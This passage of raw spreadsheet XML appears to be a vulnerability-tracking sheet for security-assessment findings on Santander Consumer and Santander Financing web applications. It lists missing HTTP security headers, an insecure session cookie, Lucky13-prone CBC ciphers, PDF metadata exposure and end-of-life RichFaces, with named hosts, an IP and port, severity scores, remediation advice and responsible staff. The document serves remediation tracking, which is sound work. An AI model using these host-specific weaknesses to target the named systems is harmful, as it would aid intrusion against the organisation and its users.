    <s v="Se recomienda que un documento sólo pueda cargar recursos del mismo origen, o recursos marcados explícitamente como cargables desde otro origen."/>
    <s v="Un atacante puede incrustar recursos de otro origen, con el objetivo de obtener información sobre ellos explotando vulnerabilidades del tipo cross-site leaks."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="109"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Motor"/>
    <s v="MAN-673f533986437e5a65e31e53"/>
    <s v="SCO-24-CNMPO-017-CO-009"/>
    <x v="64"/>
    <m/>
    <x v="1"/>
    <s v="Low"/>
    <n v="3.8"/>
    <m/>
    <m/>
    <s v="motor.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-11-19T00:00:00"/>
    <n v="581"/>
    <d v="2025-03-19T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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_x000a__x000a_Se ha detectado que los activos no contienen la cabecera Cross-Origin-Embedder-Policy."/>
    <s v="Se recomienda que un documento sólo pueda cargar recursos del mismo origen, o recursos marcados explícitamente como cargables desde otro origen."/>
    <s v="Un atacante puede incrustar recursos de otro origen, con el objetivo de obtener información sobre ellos explotando vulnerabilidades del tipo cross-site leaks."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="110"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Aliados"/>
    <s v="MAN-673f556486437e5a65e32a3f"/>
    <s v="SCO-24-CNMPO-017-CO-010"/>
    <x v="65"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.8"/>
    <m/>
    <m/>
    <s v="aliados.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-11-19T00:00:00"/>
    <n v="581"/>
    <d v="2025-03-19T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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_x000a__x000a_Se ha detectado que los activos no contienen la cabecera Cross-Origin-Resource-Policy."/>
    <s v="Se recomienda limitar la carga de recursos actuales sólo al dominio y a los subdominios."/>
    <s v="El uso de la cabecera Cross-Origin-Resource-Policy ayuda a mitigar los ataques especulativos de side-channel, así como los ataques de Cross-Site Scripting. Esta política es la única forma de proteger las imágenes de ataques Spectre."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="111"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Motor"/>
    <s v="MAN-673f557e86437e5a65e32a80"/>
    <s v="SCO-24-CNMPO-017-CO-011"/>
    <x v="65"/>
    <m/>
    <x v="1"/>
    <s v="Low"/>
    <n v="3.8"/>
    <m/>
    <m/>
    <s v="motor.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-11-19T00:00:00"/>
    <n v="581"/>
    <d v="2025-03-19T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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_x000a__x000a_Se ha detectado que los activos no contienen la cabecera Cross-Origin-Resource-Policy."/>
    <s v="Se recomienda limitar la carga de recursos actuales sólo al dominio y a los subdominios."/>
    <s v="El uso de la cabecera Cross-Origin-Resource-Policy ayuda a mitigar los ataques especulativos de side-channel, así como los ataques de Cross-Site Scripting. Esta política es la única forma de proteger las imágenes de ataques Spectre."/>
    <s v="1° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="112"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Aliados"/>
    <s v="MAN-673f55d586437e5a65e32b28"/>
    <s v="SCO-24-CNMPO-017-CO-012"/>
    <x v="66"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.8"/>
    <m/>
    <m/>
    <s v="aliados.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-11-19T00:00:00"/>
    <n v="581"/>
    <d v="2025-03-19T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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_x000a__x000a_Se ha detectado que los activos no contienen la cabecera Cross-Origin-Opener-Policy."/>
    <s v="Se recomienda aislar el contexto de navegación exclusivamente a los documentos del mismo origen. HTTP Cross-Origin-Opener-Policy: same-origin"/>
    <s v="Un atacante podría aprovechar esta vulnerabilidad para realizar acciones maliciosas como por ejemplo clickjacking, phishing, inyecciones de código o ataques de XSS."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="113"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Motor"/>
    <s v="MAN-673f55f186437e5a65e32b6e"/>
    <s v="SCO-24-CNMPO-017-CO-013"/>
    <x v="66"/>
    <m/>
    <x v="1"/>
    <s v="Low"/>
    <n v="3.8"/>
    <m/>
    <m/>
    <s v="motor.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-11-19T00:00:00"/>
    <n v="581"/>
    <d v="2025-03-19T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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_x000a__x000a_Se ha detectado que los activos no contienen la cabecera Cross-Origin-Opener-Policy."/>
    <s v="Se recomienda aislar el contexto de navegación exclusivamente a los documentos del mismo origen. HTTP Cross-Origin-Opener-Policy: same-origin"/>
    <s v="Un atacante podría aprovechar esta vulnerabilidad para realizar acciones maliciosas como por ejemplo clickjacking, phishing, inyecciones de código o ataques de XSS."/>
    <s v="1° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="114"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Aliados"/>
    <s v="MAN-673f562886437e5a65e32bc9"/>
    <s v="SCO-24-CNMPO-017-AP-014"/>
    <x v="40"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.6"/>
    <m/>
    <m/>
    <s v="aliados.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-11-19T00:00:00"/>
    <n v="581"/>
    <d v="2025-03-19T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El identificador de sesión almacenado en la cookie no se encuentra debidamente protegido mediante el atributo “secure”, lo cual permite poder transmitir los identificadores de sesión mediante canales HTTP sin cifrar, poniendo en riesgo el identificador de sesión del usuario cuando se encuentra en tránsito._x000a__x000a_Durante el ejercicio de intrusión se ha comprobado que el servidor remoto no incluye en las cabeceras de respuesta &quot;Set-Cookie&quot; de la cookie ‘JSESSIONID’ el atributo “Secure”."/>
    <s v="Se recomienda proteger los identificadores de sesión, almacenados a través de las cookies, mediante el atributo de seguridad &quot;secure&quot;. De esta manera se evitando que el identificador de sesión pueda ser transmitido por canales no cifrados. _x000a__x000a_La solución concreta dependerá del lenguaje o framework en el que esté implementado la aplicación."/>
    <s v="El robo de identificadores de la sesión de un usuario a través de las cookies podría permitir a un atacante acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos dentro de la aplicación."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="115"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Aliados"/>
    <s v="MAN-673f566386437e5a65e32c47"/>
    <s v="SCO-24-CNMPO-017-CO-015"/>
    <x v="25"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v="aliados.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-11-19T00:00:00"/>
    <n v="581"/>
    <d v="2025-03-19T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor utiliza algoritmos de cifrado CBC sobre TLS por lo que está afectado por una vulnerabilidad conocida como Lucky13. _x000a_Según se ha podido determinar el servidor utiliza cifrados CBC sobre TLS, lo que permitiría a un atacante situado en mitad de las comunicaciones (MiTM) implementar una variante del ataque conocido como Padding de Oracle (POODLE). _x000a_Todos los conjuntos de cifrado TLS y DTLS que incluyen el modo de cifrado CBC (Cipher-Block-Chaining) son potencialmente vulnerables a este tipo ataques._x000a__x000a_Durante las pruebas realizadas se ha observado que el servidor que aloja el dominio web es vulnerables a Lucky13."/>
    <s v="Se recomienda utilizar únicamente protocolos de cifrado robustos como TLS 1.2 o TLS 1.3, y eliminar los protocolos débiles como TLS 1.0 o TLS 1.1. Adicionalmente, se recomienda eliminar todos los algoritmos CBC (Cipher-Block-Chaining) que puedan estar en uso. _x000a__x000a_Además, se debe comprobar si la versión OpenSSL es 1.0.1d, 1.0.0k o 0.9.8y, las cuales tienen corregida esta vulnerabilidad. Actualizar la versión de OpenSSL si tiene una versión sin la vulnerabilidad corregida. _x000a__x000a_Puede actualizar la versión de OpenSSL desde su repositorio del sistema operativo o bien descargando la última versión del siguiente enlace: •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1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="116"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Motor"/>
    <s v="MAN-673f568486437e5a65e32c8e"/>
    <s v="SCO-24-CNMPO-017-CO-016"/>
    <x v="25"/>
    <m/>
    <x v="1"/>
    <s v="Low"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v="motor.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-11-19T00:00:00"/>
    <n v="581"/>
    <d v="2025-03-19T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor utiliza algoritmos de cifrado CBC sobre TLS por lo que está afectado por una vulnerabilidad conocida como Lucky13. _x000a_Según se ha podido determinar el servidor utiliza cifrados CBC sobre TLS, lo que permitiría a un atacante situado en mitad de las comunicaciones (MiTM) implementar una variante del ataque conocido como Padding de Oracle (POODLE). _x000a_Todos los conjuntos de cifrado TLS y DTLS que incluyen el modo de cifrado CBC (Cipher-Block-Chaining) son potencialmente vulnerables a este tipo ataques._x000a__x000a_Durante las pruebas realizadas se ha observado que el servidor que aloja el dominio web es vulnerables a Lucky13."/>
    <s v="Se recomienda utilizar únicamente protocolos de cifrado robustos como TLS 1.2 o TLS 1.3, y eliminar los protocolos débiles como TLS 1.0 o TLS 1.1. Adicionalmente, se recomienda eliminar todos los algoritmos CBC (Cipher-Block-Chaining) que puedan estar en uso. _x000a__x000a_Además, se debe comprobar si la versión OpenSSL es 1.0.1d, 1.0.0k o 0.9.8y, las cuales tienen corregida esta vulnerabilidad. Actualizar la versión de OpenSSL si tiene una versión sin la vulnerabilidad corregida. _x000a__x000a_Puede actualizar la versión de OpenSSL desde su repositorio del sistema operativo o bien descargando la última versión del siguiente enlace: •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1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="117"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <s v="MAN-6750184e86437e5a65e47f2d"/>
    <s v="SCO-24-CNMPO-018-CO-001"/>
    <x v="67"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.8"/>
    <m/>
    <m/>
    <s v="simplefinance.santanderfinancing.com"/>
    <n v="444"/>
    <m/>
    <d v="2024-12-02T00:00:00"/>
    <n v="568"/>
    <d v="2025-04-01T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cabecera X-Frame-Options se puede utilizar para indicar si se debe permitir o no que un_x000a_navegador muestre una página en un formato, &lt;frame&gt;. Los sitios pueden utilizar esto para evitar_x000a_ataques de clickjacking , al garantizar que su contenido no esté incrustado en otros_x000a_sitios.&lt;iframe&gt;&lt;embed&gt;&lt;object&gt;._x000a__x000a_Se ha detectado que los activos no contienen la cabecera X-Frame-Options."/>
    <s v="Se debe configurar el servidor web para incluir un encabezado “X-FRAME-OPTIONS”. Consulte las referencias Web para obtener más información acerca de los posibles valores de esta configuración."/>
    <s v="El servidor no devuelve un encabezado “X-Frame-Options”, lo cual significa que este sitio web puede estar en riesgo de un ataque de clickjacking. El encabezado de respuesta “HTTP X-Frame-Options” puede utilizarse para indicar al navegador si debe permitir o no renderizar una página dentro de un marco o un iframe. Algunos sitios pueden usar esto para evitar ataques de clickjacking, asegurando que su contenido no se embebe en otros sitios."/>
    <s v="1° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="118"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <s v="MAN-6750189d86437e5a65e47f2e"/>
    <s v="SCO-24-CNMPO-018-CO-002"/>
    <x v="68"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.8"/>
    <m/>
    <m/>
    <s v="simplefinance.santanderfinancing.com"/>
    <n v="444"/>
    <m/>
    <d v="2024-12-02T00:00:00"/>
    <n v="568"/>
    <d v="2025-04-01T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cabecera HTTP de respuesta &quot;X-Content-Type-Options&quot; previene que el navegador interprete código HTML que esté incrustado en otros formatos de fichero como, por ejemplo, ficheros JSON. Esto permitiría a un atacante que tuviera la posibilidad de subir contenido al servidor, a subir un archivo malicioso (por ejemplo, con código JavaScript) utilizando una extensión considerada inofensiva (.jpg). Al no estar configurado el encabezado de seguridad en cuestión, un usuario podría acceder al archivo malicioso, sin advertir que el navegador podría inferir el tipo de contenido como “text/javascript” y ejecutar el código malicioso._x000a__x000a_Se ha detectado que los activos no contienen la cabecera X-Content-Type-Options."/>
    <s v="Establezca el encabezado Content-Type correctamente en todo el sitio. X-Content-Type-Options: nosniff"/>
    <s v="Sin la cabecera &quot;X-Content-Type-Options&quot;, si la respuesta contiene un tipo MIME desconocido para el navegador, algunos navegadores tratarán de interpretar su contenido. Si un atacante puede inyectar su código malicioso (HTML, JavaScript) en la respuesta, cuando el navegador &quot;rastrea&quot; el contenido, lo identificará como &quot;text/html&quot; y ejecutará el payload malicioso El riesgo se mitiga por el hecho de que este tipo de ataque funciona solo en un número limitado de navegadores."/>
    <s v="1° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="119"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <s v="MAN-67501c2086437e5a65e47f2f"/>
    <s v="SCO-24-CNMPO-018-CO-003"/>
    <x v="47"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.8"/>
    <m/>
    <m/>
    <s v="simplefinance.santanderfinancing.com"/>
    <n v="444"/>
    <m/>
    <d v="2024-12-02T00:00:00"/>
    <n v="568"/>
    <d v="2025-04-01T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La ausencia de una cabecera CSP (Content Security Policy) correctamente configurada, disminuye las_x000a_capacidades de seguridad de esta, aumentando la susceptibilidad de la aplicación a múltiples_x000a_ataques relacionados con el uso de JavaScript, como XSS. Esta cabecera es empleada para controlar los recursos JavaScript cargados en la web, pudiendo controlar los terceros que pueden cargar scripts dentro de la página._x000a__x000a_Se ha detectado que los activos no contienen la cabecera Content-Security-Policy."/>
    <s v="Para implementar esta cabecera es necesario realizar un análisis completo de la aplicación a securizar y observar los recursos que utiliza la misma, si son locales o provienen de cierta página externa, e incluirlos en la cabecera, ya que esta va a actuar como una lista blanca para los recursos. Para habilitar la cabecera CSP, es necesario configurar el servidor web para que devuelva la cabecera HTTP Content-Security-Policy. _x000a_Bajo ningún concepto se deberá utilizar las directivas ‘unsafe-inline’ y ‘unsafe-eval’, al menos sobre “default-src”, o directivas relativas a JavaScript, como “script-src”, ya que anulan gran parte de las capacidades de seguridad de la cabecera. _x000a_Un ejemplo de configuración de cabecera es el siguiente: _x000a_· Content-Security-Policy: default-src 'self' *.trusted.com _x000a_Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una política, por ejemplo: · &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src 'self'; img-src https://*; child-src 'none';&quot;&gt;"/>
    <s v="La ausencia de la cabecera &quot;Content Security Policy&quot; puede permitir a un atacante que localice una vulnerabilidad de tipo &quot;Cross Site Scripting&quot; explotar la vulnerabilidad sin encontrarse ningún sistema de protección que mitigue su impacto. _x000a__x000a_El resultado de este ataque podría ser, la obtención información acerca de tokens de sesión, cookies y demás información sensible que un cliente pueda estar transmitiendo al sitio web."/>
    <s v="1° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="120"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <s v="MAN-67501f1886437e5a65e47f31"/>
    <s v="SCO-24-CNMPO-018-CO-004"/>
    <x v="69"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.8"/>
    <m/>
    <m/>
    <s v="simplefinance.santanderfinancing.com"/>
    <n v="444"/>
    <m/>
    <d v="2024-12-02T00:00:00"/>
    <n v="568"/>
    <d v="2025-04-01T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El encabezado Referrer-policy es un encabezado de solicitud que indica el sitio del que proviene el tráfico. Si no existe una prevención adecuada, la URL en sí misma, e incluso la información confidencial contenida en la URL, se filtrará al sitio cruzado. La falta de cabecera de la política de referencias puede afectar a la privacidad de los usuarios y del propio sitio._x000a__x000a_Se ha detectado que los activos no contienen la cabecera Referrer-Policy."/>
    <s v="Se recomienda, siempre que sea posible, marcar el atributo “Referrer-Policy” como no-refe"/>
    <s v="Si no hay medidas de prevención implementadas, la propia URL e incluso la información sensible que contiene la URL se filtrará al dominio cruzado. La ausencia de la cabecera Referrer-Policy podría afectar a la privacidad de los usuarios y del propio sitio"/>
    <s v="1° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="121"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <s v="MAN-6750211e86437e5a65e48ea1"/>
    <s v="SCO-24-CNMPO-018-CO-005"/>
    <x v="63"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.8"/>
    <m/>
    <m/>
    <s v="simplefinance.santanderfinancing.com"/>
    <n v="444"/>
    <m/>
    <d v="2024-12-02T00:00:00"/>
    <n v="568"/>
    <d v="2025-04-01T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante la realización de las pruebas se ha podido comprobar que el servidor no responde con la cabecera Permissions-Policy. Esta cabecera permite controlar que origines pueden utilizar que características del navegador._x000a__x000a_Se ha detectado que los activos no contienen la cabecera Permission-Policy."/>
    <s v="Se recomienda configurar la cabecera y deshabilitar todas las funciones que el dominio no necesite o permitir sólo a los dominios autorizados: _x000a_Permissions-Policy: geolocation=() camera=(), microphone=() _x000a_NOTA: Este ejemplo deshabilita la geolocalización, la cámara y el micrófono para todos los dominios."/>
    <s v="La ausencia de la cabecera Permissions-Policy podría permitir a un atacante abusar de algún tipo de inyección, por ejemplo, un XSS, para activar la cámara, el micrófono u otra característica del navegador."/>
    <s v="1° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="122"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <s v="MAN-6750214d86437e5a65e48ea2"/>
    <s v="SCO-24-CNMPO-018-CO-006"/>
    <x v="64"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.8"/>
    <m/>
    <m/>
    <s v="simplefinance.santanderfinancing.com"/>
    <n v="444"/>
    <m/>
    <d v="2024-12-02T00:00:00"/>
    <n v="568"/>
    <d v="2025-04-01T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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_x000a__x000a_Se ha detectado que los activos no contienen la cabecera Cross-Origin-Embedder-Policy."/>
    <s v="Se recomienda que un documento sólo pueda cargar recursos del mismo origen, o recursos marcados explícitamente como cargables desde otro origen."/>
    <s v="Un atacante puede incrustar recursos de otro origen, con el objetivo de obtener información sobre ellos explotando vulnerabilidades del tipo cross-site leaks."/>
    <s v="1° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="123"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <s v="MAN-6750217d86437e5a65e48ea3"/>
    <s v="SCO-24-CNMPO-018-CO-007"/>
    <x v="65"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.8"/>
    <m/>
    <m/>
    <s v="simplefinance.santanderfinancing.com"/>
    <n v="444"/>
    <m/>
    <d v="2024-12-02T00:00:00"/>
    <n v="568"/>
    <d v="2025-04-01T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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_x000a__x000a_Se ha detectado que los activos no contienen la cabecera Cross-Origin-Resource-Policy."/>
    <s v="Se recomienda limitar la carga de recursos actuales sólo al dominio y a los subdominios."/>
    <s v="El uso de la cabecera Cross-Origin-Resource-Policy ayuda a mitigar los ataques especulativos de side-channel, así como los ataques de Cross-Site Scripting. _x000a_Esta política es la única forma de proteger las imágenes de ataques Spectre."/>
    <s v="1° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="124"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <s v="MAN-675021a986437e5a65e48ea4"/>
    <s v="SCO-24-CNMPO-018-CO-008"/>
    <x v="66"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.8"/>
    <m/>
    <m/>
    <s v="simplefinance.santanderfinancing.com"/>
    <n v="444"/>
    <m/>
    <d v="2024-12-02T00:00:00"/>
    <n v="568"/>
    <d v="2025-04-01T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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_x000a__x000a_Se ha detectado que los activos no contienen la cabecera Cross-Origin-Opener-Policy."/>
    <s v="Se recomienda aislar el contexto de navegación exclusivamente a los documentos del mismo origen. HTTP Cross-Origin-Opener-Policy: same-origin"/>
    <s v="Un atacante podría aprovechar esta vulnerabilidad para realizar acciones maliciosas como por ejemplo clickjacking, phishing, inyecciones de código o ataques de XSS."/>
    <s v="1° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="125"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <s v="MAN-675021de86437e5a65e48ea5"/>
    <s v="SCO-24-CNMPO-018-CO-009"/>
    <x v="70"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.1"/>
    <s v="CVE-2017-9096"/>
    <m/>
    <s v="simplefinance.santanderfinancing.com"/>
    <n v="444"/>
    <m/>
    <d v="2024-12-02T00:00:00"/>
    <n v="568"/>
    <d v="2025-04-01T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Ciertos tipos de ficheros, como imágenes, PDFs o documentos de Microsoft Office almacenan información en forma de metadatos, tales como autor, fecha de creación, nombre de equipo, direccionamiento IP o tecnologías utilizadas. La aplicación web analizada alberga uno o más ficheros que contienen metadatos y que pueden proporcionar información interna de la organización, tales_x000a_como nombres de empleados, códigos de usuario o versiones de software._x000a__x000a_Tiene un CVE-2017-9096 que está relacionado con una vulnerabilidad detectada en la biblioteca de generación de documentos PDF iText 2.1.7, ampliamente utilizada para crear y manipular archivos PDF. Esta vulnerabilidad se clasifica como una exposición de información sensible y surge debido a un comportamiento inseguro al procesar archivos PDF."/>
    <s v="Se recomienda eliminar toda la información contenida en los metadatos de los documentos generados y/o publicados en la aplicación. De manera adicional se puede implementar un procedimiento para controlar los documentos a publicar, con el fin de garantizar que los mismos no contengan información sensible de la organización en sus metadatos."/>
    <s v="La información contenida en los metadatos de los archivos identificados podría ser utilizada por un atacante para obtener un mayor conocimiento de la organización, tecnologías utilizadas e incluso nombres de usuarios. Con esta información el atacante puede planificar ataques de ingeniería social o Phishing dirigidos a determinados usuarios."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="126"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Factoring"/>
    <s v="MAN-675171c086437e5a65e4abab"/>
    <s v="SC-24-CNMPO-021-VE-001"/>
    <x v="71"/>
    <m/>
    <x v="0"/>
    <s v="Medium"/>
    <n v="6.2"/>
    <m/>
    <m/>
    <s v="https://64.76.89.146:9090/factoring/a4j/g/3_3_3.Final"/>
    <m/>
    <m/>
    <d v="2024-12-04T00:00:00"/>
    <n v="566"/>
    <d v="2025-03-04T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-04-09T00:00:00"/>
    <s v="El software de terceros son programas que cubren necesidades concretas para una organización o empresa. Hay decenas de miles de proyectos de código abierto en Internet para desarrollar estas librerías y también muchas comerciales de código cerrado. Los investigadores de seguridad descubren periódicamente las vulnerabilidades del proyecto y sus librerías y las ponen a su disposición mediante un proceso de divulgación de su elección. Aunque es fácil encontrar exploits ya escritos para muchas vulnerabilidades conocidas, otras vulnerabilidades requieren un esfuerzo concentrado para desarrollar un exploit personalizado._x000a__x000a_Durante las pruebas realizadas, se identifica el uso del componente JBoss Richfaces en su versión 3.3.3 bajo el framework JBoss Seam._x000a__x000a_Este software se encuentra afectado por vulnerabilidades críticas en todas sus versiones, y actualmente, se encuentra fuera de desarrollo, por lo que no recibe nuevas actualizaciones._x000a_Dado que los principales componentes afectados, Paint2DResource y a4j:mediaOutput, no se han encontrado utilizándose en la aplicación, la criticidad se reduce a “Media”, sin embargo, si en el futuro se hace uso de alguno de estos componentes, la aplicación quedará expuesta a vulnerabilidades de Ejecución Remota de Código. Así mismo, en caso de identificarse nuevas vulnerabilidades sobre posibles componentes en uso, dado que el software se encuentra fuera del periodo de vida, no recibirá actualizaciones de seguridad, y la aplicación quedará vulnerable y sin corrección oficial."/>
    <s v="Debido a que el software se encuentra en estado de EOL (End of Life) no existen actualizaciones del producto. Se recomienda migrar el entorno a un Framework alternativo sin vulnerabilidades publicadas, y con actualizaciones periódicas. Además, se recomienda establecer un sistema de actualizaciones periódicas para evitar posibles nuevas vulnerabilidades descubiertas."/>
    <s v="Un atacante puede aprovechar las vulnerabilidades publicadas para explotarlas en las aplicaciones vulnerables. Richfaces 3.3.3: https://security.snyk.io/package/maven/org.richfaces:richfaces-a4j Adicionalmente, la falta de actualización en los componentes de un aplicativo aumenta la probabilidad de fallos de compatibilidad y rendimiento a largo plazo, empeorando el estado total del aplicativo, y dificultando la actualización de otros componentes sobre los que se puede encontrar nuevas vulnerabilidades."/>
    <m/>
    <s v="Tal como lo indica el mismo informe de vulnerabilidade, el aplicativo tiene medidas de evitan aprovechar la vulnerabilidad identificada:_x000a__x000a_No se identifican vulnerabilidades de inyección. Aunque los parámetros de entrada admiten caracteres especiales, la aplicación controla diferentes estructuras utilizadas para la creación de ejecuciones JavaScript, y no se identifican puntos donde se procesen inyecciones SQL, o ejecuciones de código remotas, o de comandos._x000a__x000a_Se implementan medidas contra ataques entre sitios web, y tokens que dificultan la automatización de ataques, y reutilización de peticiones."/>
    <s v="Jaime Vargas"/>
  </r>
  <r>
    <n v="127"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Factoring"/>
    <s v="MAN-6751735b86437e5a65e4b57c"/>
    <s v="SC-24-CNMPO-021-CO-002"/>
    <x v="72"/>
    <m/>
    <x v="0"/>
    <s v="Medium"/>
    <n v="5.8"/>
    <m/>
    <m/>
    <s v="http://64.76.89.146:9090/factoring"/>
    <m/>
    <m/>
    <d v="2024-12-04T00:00:00"/>
    <n v="566"/>
    <d v="2025-03-04T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-04-09T00:00:00"/>
